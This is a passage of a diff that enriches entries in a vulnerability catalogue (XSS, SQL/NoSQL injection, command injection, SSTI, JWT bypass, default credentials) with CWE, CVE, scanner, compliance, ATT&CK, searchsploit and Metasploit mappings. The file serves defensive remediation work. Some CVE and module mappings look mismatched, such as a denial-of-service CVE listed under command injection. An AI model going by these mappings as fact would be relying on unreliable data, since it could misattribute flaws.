@@ -3855,30 +4373,64 @@
       "cwe": [
         "CWE-915"
       ],
-      "cve_examples": [],
+      "cve_examples": [
+        "CVE-2012-3464",
+        "CVE-2021-21234"
+      ],
       "cvss_v3_base": 8.1,
       "cvss_vector": "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N",
-      "nessus_plugin_ids": [],
-      "qualys_qids": [],
+      "nessus_plugin_ids": [
+        174662
+      ],
+      "qualys_qids": [
+        150146
+      ],
       "owasp_web": "A04:2021 Insecure Design",
       "owasp_api": "API6:2023 Unrestricted Access to Sensitive Business Flows",
-      "nist_csf2": [],
-      "nist_800_53": [],
-      "nist_800_171": [],
-      "pci_dss_4": [],
-      "iso_27001": [],
-      "iso_27002": [],
-      "soc2": [],
-      "hitrust": [],
+      "nist_csf2": [
+        "PR.AA-05"
+      ],
+      "nist_800_53": [
+        "AC-3",
+        "SI-10"
+      ],
+      "nist_800_171": [
+        "3.1.3"
+      ],
+      "pci_dss_4": [
+        "6.2.4"
+      ],
+      "iso_27001": [
+        "A.9.4.1"
+      ],
+      "iso_27002": [
+        "9.4.1"
+      ],
+      "soc2": [
+        "CC6.3"
+      ],
+      "hitrust": [
+        "01.a"
+      ],
       "gdpr": [],
-      "mitre_attack": [],
-      "searchsploit_terms": [],
+      "mitre_attack": [
+        {
+          "technique": "T1078",
+          "tactic": "Privilege Escalation",
+          "name": "Valid Accounts"
+        }
+      ],
+      "searchsploit_terms": [
+        "mass assignment parameter",
+        "ruby on rails mass assignment",
+        "mass assignment"
+      ],
       "metasploit_modules": [],
       "kev": false,
       "remediation_brief": "Never bind request body data directly to model objects. Use Data Transfer Objects (DTOs) with explicit field mappings for each endpoint. Implement an allowlist of fields that each endpoint is permitted to modify. Mark sensitive model fields (role, isAdmin, balance) with @ReadOnly or equivalent annotations to prevent them from being modified via API binding. Conduct a full audit of all PATCH and PUT endpoints.",
-      "remediation_component": "",
-      "remediation_category": "",
-      "remediation_effort": "",
+      "remediation_component": "Application",
+      "remediation_category": "Access Control",
+      "remediation_effort": "Low",
       "validation_tools": [
         "https://cheatsheetseries.owasp.org/cheatsheets/Mass_Assignment_Cheat_Sheet.html",
         "https://owasp.org/API-Security/editions/2023/en/0xa6-unrestricted-access-to-sensitive-business-flows/",
@@ -4145,36 +4697,101 @@
     {
       "id": "SI-074",
       "title": "Reflected Cross-Site Scripting (XSS)",
-      "aliases": [],
+      "aliases": [
+        "Cross-Site Scripting",
+        "XSS Vulnerability",
+        "DOM-Based XSS",
+        "DOM-Based Cross-Site Scripting (XSS)",
+        "XSS in API Response",
+        "HTML Injection",
+        "Reflected XSS",
+        "Script Injection",
+        "XSS Confirmed by dalfox",
+        "Reflected Cross-Site Scripting (XSS)",
+        "Stored XSS"
+      ],
       "source_tools": [
         "siphon"
       ],
       "risk": "HIGH",
-      "cwe": [],
-      "cve_examples": [],
+      "cwe": [
+        "CWE-79",
+        "CWE-116"
+      ],
+      "cve_examples": [
+        "CVE-2020-11022",
+        "CVE-2021-41182",
+        "CVE-2022-21824",
+        "CVE-2023-24488"
+      ],
       "cvss_v3_base": 7.2,
       "cvss_vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:H/I:L/A:N",
-      "nessus_plugin_ids": [],
-      "qualys_qids": [],
+      "nessus_plugin_ids": [
+        10815,
+        49067,
+        84502
+      ],
+      "qualys_qids": [
+        150012,
+        150013,
+        150014
+      ],
       "owasp_web": "A03:2021 Injection",
       "owasp_api": "API8:2023 Security Misconfiguration",
-      "nist_csf2": [],
-      "nist_800_53": [],
-      "nist_800_171": [],
-      "pci_dss_4": [],
-      "iso_27001": [],
-      "iso_27002": [],
-      "soc2": [],
-      "hitrust": [],
-      "gdpr": [],
-      "mitre_attack": [],
-      "searchsploit_terms": [],
-      "metasploit_modules": [],
+      "nist_csf2": [
+        "PR.DS-02",
+        "DE.CM-01"
+      ],
+      "nist_800_53": [
+        "SI-10",
+        "SC-18"
+      ],
+      "nist_800_171": [
+        "3.14.7"
+      ],
+      "pci_dss_4": [
+        "6.2.4"
+      ],
+      "iso_27001": [
+        "A.8.28"
+      ],
+      "iso_27002": [
+        "8.28"
+      ],
+      "soc2": [
+        "CC6.6",
+        "CC7.1"
+      ],
+      "hitrust": [
+        "09.ab"
+      ],
+      "gdpr": [
+        "Article 32"
+      ],
+      "mitre_attack": [
+        {
+          "technique": "T1189",
+          "tactic": "Initial Access",
+          "name": "Drive-by Compromise"
+        },
+        {
+          "technique": "T1059.007",
+          "tactic": "Execution",
+          "name": "JavaScript"
+        }
+      ],
+      "searchsploit_terms": [
+        "xss",
+        "cross site scripting"
+      ],
+      "metasploit_modules": [
+        "auxiliary/scanner/http/xssed_search"
+      ],
       "kev": false,
       "remediation_brief": "Apply context-appropriate output encoding to all user-supplied data reflected in HTML responses. Use a security-focused templating engine that provides automatic escaping. Implement a strict Content-Security-Policy to mitigate XSS exploitation even if encoding is bypassed. Set the HttpOnly flag on session cookies. Validate and sanitize all input server-side before reflecting it in any response.",
-      "remediation_component": "",
-      "remediation_category": "",
-      "remediation_effort": "",
+      "remediation_component": "Application",
+      "remediation_category": "Input Validation",
+      "remediation_effort": "Moderate",
       "validation_tools": [
         "https://portswigger.net/web-security/cross-site-scripting",
         "https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html",
@@ -4823,12 +5440,19 @@
     {
       "id": "SI-086",
       "title": "Default Credentials Accepted on API Login Endpoint",
-      "aliases": [],
+      "aliases": [
+        "Default Credentials Accepted on API Login Endpoint",
+        "SSH Brute-Force Credentials Valid",
+        "Valid Credentials via Brute Force"
+      ],
       "source_tools": [
         "siphon"
       ],
       "risk": "CRITICAL",
-      "cwe": [],
+      "cwe": [
+        "CWE-307",
+        "CWE-521"
+      ],
       "cve_examples": [],
       "cvss_v3_base": 9.8,
       "cvss_vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H",
@@ -4836,23 +5460,68 @@
       "qualys_qids": [],
       "owasp_web": "A07:2021 Identification and Authentication Failures",
       "owasp_api": "API2:2023 Broken Authentication",
-      "nist_csf2": [],
-      "nist_800_53": [],
-      "nist_800_171": [],
-      "pci_dss_4": [],
-      "iso_27001": [],
-      "iso_27002": [],
-      "soc2": [],
-      "hitrust": [],
-      "gdpr": [],
-      "mitre_attack": [],
-      "searchsploit_terms": [],
-      "metasploit_modules": [],
+      "nist_csf2": [
+        "PR.AA-01",
+        "DE.CM-01"
+      ],
+      "nist_800_53": [
+        "IA-5",
+        "AC-7",
+        "SI-4"
+      ],
+      "nist_800_171": [
+        "3.5.2",
+        "3.5.7"
+      ],
+      "pci_dss_4": [
+        "8.3.1",
+        "8.3.4",
+        "8.3.6"
+      ],
+      "iso_27001": [
+        "A.9.4.2",
+        "A.9.3.1"
+      ],
+      "iso_27002": [
+        "9.4.2",
+        "9.3.1"
+      ],
+      "soc2": [
+        "CC6.1"
+      ],
+      "hitrust": [
+        "01.a",
+        "01.b"
+      ],
+      "gdpr": [
+        "Article 32"
+      ],
+      "mitre_attack": [
+        {
+          "technique": "T1110",
+          "tactic": "Credential Access",
+          "name": "Brute Force"
+        },
+        {
+          "technique": "T1078",
+          "tactic": "Initial Access",
+          "name": "Valid Accounts"
+        }
+      ],
+      "searchsploit_terms": [
+        "default credentials",
+        "brute force ssh",
+        "hydra credentials"
+      ],
+      "metasploit_modules": [
+        "auxiliary/scanner/ssh/ssh_login",
+        "auxiliary/scanner/ftp/ftp_login"
+      ],
       "kev": false,
       "remediation_brief": "Immediately change all default credentials on all accounts. Force password change on first login for all accounts provisioned with default credentials. Implement a credential policy that prevents setting passwords matching known-default or commonly-used values. Audit all accounts and API keys for default or trivially-guessable credentials. Disable any service accounts with default credentials that are not currently in use.",
-      "remediation_component": "",
-      "remediation_category": "",
-      "remediation_effort": "",
+      "remediation_component": "Application",
+      "remediation_category": "Access Control",
+      "remediation_effort": "Low",
       "validation_tools": [
         "https://owasp.org/API-Security/editions/2023/en/0xa2-broken-authentication/",
         "https://cheatsheetseries.owasp.org/cheatsheets/Authentication_Cheat_Sheet.html",
@@ -4940,38 +5609,87 @@
     {
       "id": "SI-088",
       "title": "JWT None Algorithm Accepted",
-      "aliases": [],
+      "aliases": [
+        "JWT alg:none Vulnerability",
+        "JWT RS256 to HS256 Confusion",
+        "JWT Signature Bypass",
+        "JWT None Algorithm Authentication Bypass",
+        "JSON Web Token Bypass",
+        "JWT Algorithm Confusion"
+      ],
       "source_tools": [
         "siphon"
       ],
       "risk": "CRITICAL",
-      "cwe": [],
+      "cwe": [
+        "CWE-347"
+      ],
       "cve_examples": [
         "CVE-2015-9235"
       ],
       "cvss_v3_base": 9.8,
       "cvss_vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H",
-      "nessus_plugin_ids": [],
-      "qualys_qids": [],
+      "nessus_plugin_ids": [
+        174656
+      ],
+      "qualys_qids": [
+        150130
+      ],
       "owasp_web": "A07:2021 Identification and Authentication Failures",
       "owasp_api": "API2:2023 Broken Authentication",
-      "nist_csf2": [],
-      "nist_800_53": [],
-      "nist_800_171": [],
-      "pci_dss_4": [],
-      "iso_27001": [],
-      "iso_27002": [],
-      "soc2": [],
-      "hitrust": [],
-      "gdpr": [],
-      "mitre_attack": [],
-      "searchsploit_terms": [],
-      "metasploit_modules": [],
+      "nist_csf2": [
+        "PR.AA-01",
+        "PR.DS-01"
+      ],
+      "nist_800_53": [
+        "IA-5",
+        "SC-8"
+      ],
+      "nist_800_171": [
+        "3.5.10",
+        "3.13.8"
+      ],
+      "pci_dss_4": [
+        "4.2.1",
+        "8.3.6"
+      ],
+      "iso_27001": [
+        "A.9.4.2",
+        "A.10.1.1"
+      ],
+      "iso_27002": [
+        "9.4.2",
+        "10.1.1"
+      ],
+      "soc2": [
+        "CC6.1"
+      ],
+      "hitrust": [
+        "01.b",
+        "10.f"
+      ],
+      "gdpr": [
+        "Article 32"
+      ],
+      "mitre_attack": [
+        {
+          "technique": "T1550.001",
+          "tactic": "Defense Evasion",
+          "name": "Use Alternate Authentication Material: Application Access Token"
+        }
+      ],
+      "searchsploit_terms": [
+        "jwt",
+        "json web token"
+      ],
+      "metasploit_modules": [
+        "auxiliary/scanner/http/jwt_none_alg_bypass"
+      ],
       "kev": false,
       "remediation_brief": "Implement an explicit algorithm allowlist in the JWT verification configuration and reject all tokens using the 'none' algorithm. Never rely on the algorithm specified in the JWT header to determine how to verify the token \u2014 use a server-side configured algorithm. Upgrade JWT libraries to versions that do not accept the 'none' algorithm by default. Audit all JWT validation code paths for algorithm confusion vulnerabilities.",
-      "remediation_component": "",
-      "remediation_category": "",
-      "remediation_effort": "",
+      "remediation_component": "Authentication",
+      "remediation_category": "Authentication",
+      "remediation_effort": "Low",
       "validation_tools": [
         "https://portswigger.net/web-security/jwt/lab-jwt-authentication-bypass-via-unverified-signature",
         "https://auth0.com/blog/critical-vulnerabilities-in-json-web-token-libraries/",
@@ -5003,36 +5721,109 @@
     {
       "id": "SI-089",
       "title": "SQL Injection in API Parameter",
-      "aliases": [],
+      "aliases": [
+        "SQLi",
+        "Database Injection",
+        "Blind SQL Injection (Boolean-Based)",
+        "Blind SQL Injection",
+        "Time-Based SQL Injection",
+        "SQL Injection Confirmed by sqlmap",
+        "Second-Order SQL Injection",
+        "SQL Injection in API Parameter",
+        "SQL Error-Based Injection",
+        "SQL Injection (Error-Based) in API Parameter",
+        "SQL Injection",
+        "Union-Based SQL Injection",
+        "Blind SQL Injection (Time-Based)"
+      ],
       "source_tools": [
         "siphon"
       ],
       "risk": "CRITICAL",
-      "cwe": [],
-      "cve_examples": [],
+      "cwe": [
+        "CWE-20",
+        "CWE-89",
+        "CWE-943"
+      ],
+      "cve_examples": [
+        "CVE-2021-27101",
+        "CVE-2019-18371",
+        "CVE-2023-23752",
+        "CVE-2022-31269",
+        "CVE-2023-32315"
+      ],
       "cvss_v3_base": 9.8,
       "cvss_vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H",
-      "nessus_plugin_ids": [],
-      "qualys_qids": [],
+      "nessus_plugin_ids": [
+        10677,
+        42424,
+        11213,
+        50393
+      ],
+      "qualys_qids": [
+        150022,
+        150023,
+        150024
+      ],
       "owasp_web": "A03:2021 Injection",
       "owasp_api": "API8:2023 Security Misconfiguration",
-      "nist_csf2": [],
-      "nist_800_53": [],
-      "nist_800_171": [],
-      "pci_dss_4": [],
-      "iso_27001": [],
-      "iso_27002": [],
-      "soc2": [],
-      "hitrust": [],
-      "gdpr": [],
-      "mitre_attack": [],
-      "searchsploit_terms": [],
-      "metasploit_modules": [],
+      "nist_csf2": [
+        "DE.CM-01",
+        "PR.DS-02"
+      ],
+      "nist_800_53": [
+        "SI-10",
+        "SA-11",
+        "RA-5"
+      ],
+      "nist_800_171": [
+        "3.14.7"
+      ],
+      "pci_dss_4": [
+        "6.2.4",
+        "6.3.2"
+      ],
+      "iso_27001": [
+        "A.8.28"
+      ],
+      "iso_27002": [
+        "8.28"
+      ],
+      "soc2": [
+        "CC7.1",
+        "CC6.6"
+      ],
+      "hitrust": [
+        "07.a",
+        "09.ab"
+      ],
+      "gdpr": [
+        "Article 32"
+      ],
+      "mitre_attack": [
+        {
+          "technique": "T1190",
+          "tactic": "Initial Access",
+          "name": "Exploit Public-Facing Application"
+        },
+        {
+          "technique": "T1059",
+          "tactic": "Execution",
+          "name": "Command and Scripting Interpreter"
+        }
+      ],
+      "searchsploit_terms": [
+        "sql injection",
+        "sqlmap"
+      ],
+      "metasploit_modules": [
+        "auxiliary/scanner/http/sqli_scanner"
+      ],
       "kev": false,
       "remediation_brief": "Replace all dynamic SQL query construction with parameterized queries or prepared statements. Use an ORM that automatically parameterizes queries. If dynamic queries are unavoidable, use an allowlist-based escaping function appropriate for the database platform. Apply the principle of least privilege to database accounts: the API's DB user should not have DROP, TRUNCATE, or file access permissions. Implement a WAF rule for SQL injection patterns as defense-in-depth.",
-      "remediation_component": "",
-      "remediation_category": "",
-      "remediation_effort": "",
+      "remediation_component": "Application",
+      "remediation_category": "Input Validation",
+      "remediation_effort": "Moderate",
       "validation_tools": [
         "https://portswigger.net/web-security/sql-injection",
         "https://cheatsheetseries.owasp.org/cheatsheets/SQL_Injection_Prevention_Cheat_Sheet.html",
@@ -5062,7 +5853,21 @@
     {
       "id": "SI-090",
       "title": "Blind SQL Injection (Boolean-Based)",
-      "aliases": [],
+      "aliases": [
+        "SQLi",
+        "Database Injection",
+        "Blind SQL Injection (Boolean-Based)",
+        "Blind SQL Injection",
+        "Time-Based SQL Injection",
+        "SQL Injection Confirmed by sqlmap",
+        "Second-Order SQL Injection",
+        "SQL Injection in API Parameter",
+        "SQL Error-Based Injection",
+        "SQL Injection (Error-Based) in API Parameter",
+        "SQL Injection",
+        "Union-Based SQL Injection",
+        "Blind SQL Injection (Time-Based)"
+      ],
       "source_tools": [
         "siphon"
       ],
@@ -5070,30 +5875,85 @@
       "cwe": [
         "CWE-89"
       ],
-      "cve_examples": [],
+      "cve_examples": [
+        "CVE-2021-27101",
+        "CVE-2019-18371",
+        "CVE-2023-23752",
+        "CVE-2022-31269",
+        "CVE-2023-32315"
+      ],
       "cvss_v3_base": 9.1,
       "cvss_vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N",
-      "nessus_plugin_ids": [],
-      "qualys_qids": [],
+      "nessus_plugin_ids": [
+        10677,
+        42424,
+        11213,
+        50393
+      ],
+      "qualys_qids": [
+        150022,
+        150023,
+        150024
+      ],
       "owasp_web": "A03:2021 Injection",
       "owasp_api": "API8:2023 Security Misconfiguration",
-      "nist_csf2": [],
-      "nist_800_53": [],
-      "nist_800_171": [],
-      "pci_dss_4": [],
-      "iso_27001": [],
-      "iso_27002": [],
-      "soc2": [],
-      "hitrust": [],
-      "gdpr": [],
-      "mitre_attack": [],
-      "searchsploit_terms": [],
-      "metasploit_modules": [],
+      "nist_csf2": [
+        "DE.CM-01",
+        "PR.DS-02"
+      ],
+      "nist_800_53": [
+        "SI-10",
+        "SA-11",
+        "RA-5"
+      ],
+      "nist_800_171": [
+        "3.14.7"
+      ],
+      "pci_dss_4": [
+        "6.2.4",
+        "6.3.2"
+      ],
+      "iso_27001": [
+        "A.8.28"
+      ],
+      "iso_27002": [
+        "8.28"
+      ],
+      "soc2": [
+        "CC7.1",
+        "CC6.6"
+      ],
+      "hitrust": [
+        "07.a",
+        "09.ab"
+      ],
+      "gdpr": [
+        "Article 32"
+      ],
+      "mitre_attack": [
+        {
+          "technique": "T1190",
+          "tactic": "Initial Access",
+          "name": "Exploit Public-Facing Application"
+        },
+        {
+          "technique": "T1059",
+          "tactic": "Execution",
+          "name": "Command and Scripting Interpreter"
+        }
+      ],
+      "searchsploit_terms": [
+        "sql injection",
+        "sqlmap"
+      ],
+      "metasploit_modules": [
+        "auxiliary/scanner/http/sqli_scanner"
+      ],
       "kev": false,
       "remediation_brief": "Replace all dynamic SQL construction with parameterized queries. The remediation is identical to direct SQL injection (SI-089). Blind injection is often harder to detect through manual code review, making comprehensive use of parameterized queries and ORM frameworks critical. Run automated SQL injection scans (sqlmap) against all API endpoints as part of security testing.",
-      "remediation_component": "",
-      "remediation_category": "",
-      "remediation_effort": "",
+      "remediation_component": "Application",
+      "remediation_category": "Input Validation",
+      "remediation_effort": "Moderate",
       "validation_tools": [
         "https://portswigger.net/web-security/sql-injection/blind",
         "https://cheatsheetseries.owasp.org/cheatsheets/SQL_Injection_Prevention_Cheat_Sheet.html",
@@ -5123,7 +5983,21 @@
     {
       "id": "SI-091",
       "title": "Blind SQL Injection (Time-Based)",
-      "aliases": [],
+      "aliases": [
+        "SQLi",
+        "Database Injection",
+        "Blind SQL Injection (Boolean-Based)",
+        "Blind SQL Injection",
+        "Time-Based SQL Injection",
+        "SQL Injection Confirmed by sqlmap",
+        "Second-Order SQL Injection",
+        "SQL Injection in API Parameter",
+        "SQL Error-Based Injection",
+        "SQL Injection (Error-Based) in API Parameter",
+        "SQL Injection",
+        "Union-Based SQL Injection",
+        "Blind SQL Injection (Time-Based)"
+      ],
       "source_tools": [
         "siphon"
       ],
@@ -5131,30 +6005,85 @@
       "cwe": [
         "CWE-89"
       ],
-      "cve_examples": [],
+      "cve_examples": [
+        "CVE-2021-27101",
+        "CVE-2019-18371",
+        "CVE-2023-23752",
+        "CVE-2022-31269",
+        "CVE-2023-32315"
+      ],
       "cvss_v3_base": 9.1,
       "cvss_vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N",
-      "nessus_plugin_ids": [],
-      "qualys_qids": [],
+      "nessus_plugin_ids": [
+        10677,
+        42424,
+        11213,
+        50393
+      ],
+      "qualys_qids": [
+        150022,
+        150023,
+        150024
+      ],
       "owasp_web": "A03:2021 Injection",
       "owasp_api": "API8:2023 Security Misconfiguration",
-      "nist_csf2": [],
-      "nist_800_53": [],
-      "nist_800_171": [],
-      "pci_dss_4": [],
-      "iso_27001": [],
-      "iso_27002": [],
-      "soc2": [],
-      "hitrust": [],
-      "gdpr": [],
-      "mitre_attack": [],
-      "searchsploit_terms": [],
-      "metasploit_modules": [],
+      "nist_csf2": [
+        "DE.CM-01",
+        "PR.DS-02"
+      ],
+      "nist_800_53": [
+        "SI-10",
+        "SA-11",
+        "RA-5"
+      ],
+      "nist_800_171": [
+        "3.14.7"
+      ],
+      "pci_dss_4": [
+        "6.2.4",
+        "6.3.2"
+      ],
+      "iso_27001": [
+        "A.8.28"
+      ],
+      "iso_27002": [
+        "8.28"
+      ],
+      "soc2": [
+        "CC7.1",
+        "CC6.6"
+      ],
+      "hitrust": [
+        "07.a",
+        "09.ab"
+      ],
+      "gdpr": [
+        "Article 32"
+      ],
+      "mitre_attack": [
+        {
+          "technique": "T1190",
+          "tactic": "Initial Access",
+          "name": "Exploit Public-Facing Application"
+        },
+        {
+          "technique": "T1059",
+          "tactic": "Execution",
+          "name": "Command and Scripting Interpreter"
+        }
+      ],
+      "searchsploit_terms": [
+        "sql injection",
+        "sqlmap"
+      ],
+      "metasploit_modules": [
+        "auxiliary/scanner/http/sqli_scanner"
+      ],
       "kev": false,
       "remediation_brief": "The remediation is identical to direct SQL injection (SI-089): use parameterized queries exclusively. Additionally, implement query timeout limits at the database level to limit the impact of time-delay attacks. Monitor for anomalously slow API response times as an indicator of time-based injection probing.",
-      "remediation_component": "",
-      "remediation_category": "",
-      "remediation_effort": "",
+      "remediation_component": "Application",
+      "remediation_category": "Input Validation",
+      "remediation_effort": "Moderate",
       "validation_tools": [
         "https://portswigger.net/web-security/sql-injection/blind",
         "https://cheatsheetseries.owasp.org/cheatsheets/SQL_Injection_Prevention_Cheat_Sheet.html",
@@ -5184,36 +6113,81 @@
     {
       "id": "SI-092",
       "title": "NoSQL Injection in API Parameter",
-      "aliases": [],
+      "aliases": [
+        "NoSQL Injection in API Parameter",
+        "CouchDB Injection",
+        "Operator Injection",
+        "Redis Injection",
+        "NoSQLi",
+        "MongoDB Injection",
+        "NoSQL Injection in API"
+      ],
       "source_tools": [
         "siphon"
       ],
       "risk": "CRITICAL",
-      "cwe": [],
-      "cve_examples": [],
+      "cwe": [
+        "CWE-943"
+      ],
+      "cve_examples": [
+        "CVE-2019-7609",
+        "CVE-2022-36881"
+      ],
       "cvss_v3_base": 9.1,
       "cvss_vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N",
-      "nessus_plugin_ids": [],
-      "qualys_qids": [],
+      "nessus_plugin_ids": [
+        174659
+      ],
+      "qualys_qids": [
+        150044
+      ],
       "owasp_web": "A03:2021 Injection",
       "owasp_api": "API8:2023 Security Misconfiguration",
-      "nist_csf2": [],
-      "nist_800_53": [],
-      "nist_800_171": [],
-      "pci_dss_4": [],
-      "iso_27001": [],
-      "iso_27002": [],
-      "soc2": [],
-      "hitrust": [],
+      "nist_csf2": [
+        "PR.DS-02",
+        "DE.CM-01"
+      ],
+      "nist_800_53": [
+        "SI-10"
+      ],
+      "nist_800_171": [
+        "3.14.7"
+      ],
+      "pci_dss_4": [
+        "6.2.4"
+      ],
+      "iso_27001": [
+        "A.8.28"
+      ],
+      "iso_27002": [
+        "8.28"
+      ],
+      "soc2": [
+        "CC6.6"
+      ],
+      "hitrust": [
+        "09.ab"
+      ],
       "gdpr": [],
-      "mitre_attack": [],
-      "searchsploit_terms": [],
-      "metasploit_modules": [],
+      "mitre_attack": [
+        {
+          "technique": "T1190",
+          "tactic": "Initial Access",
+          "name": "Exploit Public-Facing Application"
+        }
+      ],
+      "searchsploit_terms": [
+        "nosql injection",
+        "mongodb injection"
+      ],
+      "metasploit_modules": [
+        "auxiliary/scanner/http/sqli_scanner"
+      ],
       "kev": false,
       "remediation_brief": "Validate that all user-supplied query parameters are of the expected primitive type (string, number) before constructing database queries. For MongoDB, use the official driver's parameterization features and reject any input containing MongoDB operator characters ($, .). Use ODM libraries (Mongoose) that enforce schema validation. Disable JavaScript execution operators ($where) in MongoDB if not required. Apply input allowlist validation before any database query construction.",
-      "remediation_component": "",
-      "remediation_category": "",
-      "remediation_effort": "",
+      "remediation_component": "Application",
+      "remediation_category": "Input Validation",
+      "remediation_effort": "Moderate",
       "validation_tools": [
         "https://portswigger.net/web-security/nosql-injection",
         "https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Penetration_Testing/07-Input_Validation_Testing/05.6-Testing_for_NoSQL_Injection",
@@ -5241,36 +6215,99 @@
     {
       "id": "SI-093",
       "title": "OS Command Injection in API Parameter",
-      "aliases": [],
+      "aliases": [
+        "Shell Injection",
+        "Remote Code Execution",
+        "Remote Command Execution",
+        "Command Injection",
+        "OS Command Injection in API Parameter",
+        "OS Command Injection",
+        "RCE via Command Injection",
+        "OS Command Execution",
+        "Remote Code Execution via Code Injection"
+      ],
       "source_tools": [
         "siphon"
       ],
       "risk": "CRITICAL",
-      "cwe": [],
-      "cve_examples": [],
+      "cwe": [
+        "CWE-20",
+        "CWE-77",
+        "CWE-78"
+      ],
+      "cve_examples": [
+        "CVE-2021-41773",
+        "CVE-2022-24847",
+        "CVE-2022-26134",
+        "CVE-2023-44487"
+      ],
       "cvss_v3_base": 10.0,
       "cvss_vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H",
-      "nessus_plugin_ids": [],
-      "qualys_qids": [],
+      "nessus_plugin_ids": [
+        10676,
+        153953
+      ],
+      "qualys_qids": [
+        150050,
+        150051
+      ],
       "owasp_web": "A03:2021 Injection",
       "owasp_api": "API8:2023 Security Misconfiguration",
-      "nist_csf2": [],
-      "nist_800_53": [],
-      "nist_800_171": [],
-      "pci_dss_4": [],
-      "iso_27001": [],
-      "iso_27002": [],
-      "soc2": [],
-      "hitrust": [],
-      "gdpr": [],
-      "mitre_attack": [],
-      "searchsploit_terms": [],
-      "metasploit_modules": [],
-      "kev": false,
+      "nist_csf2": [
+        "PR.DS-02",
+        "DE.CM-01"
+      ],
+      "nist_800_53": [
+        "SI-10",
+        "CM-6",
+        "SA-11"
+      ],
+      "nist_800_171": [
+        "3.14.7"
+      ],
+      "pci_dss_4": [
+        "6.2.4"
+      ],
+      "iso_27001": [
+        "A.8.28"
+      ],
+      "iso_27002": [
+        "8.28"
+      ],
+      "soc2": [
+        "CC7.1",
+        "CC6.6"
+      ],
+      "hitrust": [
+        "09.ab"
+      ],
+      "gdpr": [
+        "Article 32"
+      ],
+      "mitre_attack": [
+        {
+          "technique": "T1190",
+          "tactic": "Initial Access",
+          "name": "Exploit Public-Facing Application"
+        },
+        {
+          "technique": "T1059",
+          "tactic": "Execution",
+          "name": "Command and Scripting Interpreter"
+        }
+      ],
+      "searchsploit_terms": [
+        "command injection",
+        "rce"
+      ],
+      "metasploit_modules": [
+        "exploit/multi/http/apache_mod_cgi_bash_env_exec"
+      ],
+      "kev": true,
       "remediation_brief": "Eliminate all use of shell command execution with user-supplied input. Replace shell-based functionality with language-native library calls that do not invoke a shell. If OS command execution is unavoidable, pass arguments as a list (not a string) to prevent shell interpretation, and validate all inputs against a strict allowlist of permitted values. Run the application with the minimum OS privileges necessary. Implement application sandboxing (containers, seccomp) to limit the impact of command injection.",
-      "remediation_component": "",
-      "remediation_category": "",
-      "remediation_effort": "",
+      "remediation_component": "Application",
+      "remediation_category": "Input Validation",
+      "remediation_effort": "Moderate",
       "validation_tools": [
         "https://portswigger.net/web-security/os-command-injection",
         "https://cheatsheetseries.owasp.org/cheatsheets/OS_Command_Injection_Defense_Cheat_Sheet.html",
@@ -5298,36 +6335,91 @@
     {
       "id": "SI-094",
       "title": "Server-Side Template Injection (SSTI)",
-      "aliases": [],
+      "aliases": [
+        "Freemarker Injection",
+        "Template Injection",
+        "Twig Injection",
+        "Pebble Injection",
+        "Velocity Template Injection",
+        "SSTI",
+        "Jinja2 Template Injection"
+      ],
       "source_tools": [
         "siphon"
       ],
       "risk": "CRITICAL",
-      "cwe": [],
-      "cve_examples": [],
+      "cwe": [
+        "CWE-94"
+      ],
+      "cve_examples": [
+        "CVE-2019-8341",
+        "CVE-2021-29441",
+        "CVE-2022-22947",
+        "CVE-2023-46604"
+      ],
       "cvss_v3_base": 9.8,
       "cvss_vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H",
-      "nessus_plugin_ids": [],
-      "qualys_qids": [],
+      "nessus_plugin_ids": [
+        174857
+      ],
+      "qualys_qids": [
+        150045,
+        150046
+      ],
       "owasp_web": "A03:2021 Injection",
       "owasp_api": "API8:2023 Security Misconfiguration",
-      "nist_csf2": [],
-      "nist_800_53": [],
-      "nist_800_171": [],
-      "pci_dss_4": [],
-      "iso_27001": [],
-      "iso_27002": [],
-      "soc2": [],
-      "hitrust": [],
-      "gdpr": [],
-      "mitre_attack": [],
-      "searchsploit_terms": [],
+      "nist_csf2": [
+        "PR.DS-02",
+        "DE.CM-01"
+      ],
+      "nist_800_53": [
+        "SI-10",
+        "SA-11"
+      ],
+      "nist_800_171": [
+        "3.14.7"
+      ],
+      "pci_dss_4": [
+        "6.2.4"
+      ],
+      "iso_27001": [
+        "A.8.28"
+      ],
+      "iso_27002": [
+        "8.28"
+      ],
+      "soc2": [
+        "CC6.6"
+      ],
+      "hitrust": [
+        "09.ab"
+      ],
+      "gdpr": [
+        "Article 32"
+      ],
+      "mitre_attack": [
+        {
+          "technique": "T1190",
+          "tactic": "Initial Access",
+          "name": "Exploit Public-Facing Application"
+        },
+        {
+          "technique": "T1059",
+          "tactic": "Execution",
+          "name": "Command and Scripting Interpreter"
+        }
+      ],
+      "searchsploit_terms": [
+        "ssti",
+        "template injection",
+        "jinja2"
+      ],
       "metasploit_modules": [],
       "kev": false,
       "remediation_brief": "Never concatenate user-supplied data directly into template strings. Pass user data as template variables that are rendered by the template engine safely, not as template code. Use templates that are defined statically in the codebase, not constructed dynamically from user input. If user-controlled templates are a business requirement, use a sandboxed template engine that prevents access to dangerous objects and methods.",
-      "remediation_component": "",
-      "remediation_category": "",
-      "remediation_effort": "",
+      "remediation_component": "Application",
+      "remediation_category": "Input Validation",
+      "remediation_effort": "Moderate",
       "validation_tools": [
         "https://portswigger.net/web-security/server-side-template-injection",
         "https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Penetration_Testing/07-Input_Validation_Testing/18-Testing_for_Server-side_Template_Injection",
@@ -5355,36 +6447,95 @@
     {
       "id": "SI-095",
       "title": "Path Traversal / Local File Inclusion in API",
-      "aliases": [],
+      "aliases": [
+        "File Path Traversal",
+        "Arbitrary File Read",
+        "Dot-Dot-Slash Attack",
